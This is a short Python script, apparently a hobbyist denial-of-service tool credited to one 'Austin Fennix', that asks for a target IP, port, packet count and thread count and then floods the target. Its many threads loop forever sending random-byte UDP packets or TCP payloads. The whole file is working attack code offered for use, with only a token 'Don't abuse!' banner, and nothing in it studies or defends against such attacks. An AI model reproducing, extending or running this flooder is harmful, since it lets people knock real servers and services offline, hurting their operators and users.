#!/usr/bin/env python3
#Ddos by austinfennix
import random
import socket
import threading
import os

os.system("clear")
print(" This Tools Created by Austin Fennix")
print(" Don't abuse! ")
print(" Instagram : @tdyfnnx_ ")
ip = str(input(" DDoSAttackByAustin | Ip:"))
port = int(input(" DDoSAttackByAustin | Port:"))
choice = str(input(" DDoSAttackByAustin | Gas Gak Ni?(y/n):"))
times = int(input(" DDoSAttackByAustin | Packets:"))
threads = int(input(" DDoSAttackByAustin | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Attack |")
		except:
			print("[!] | Austin Is Here |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Austin nih bos!!!")
		except:
			s.close()
			print("[*] Austin Is Here")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
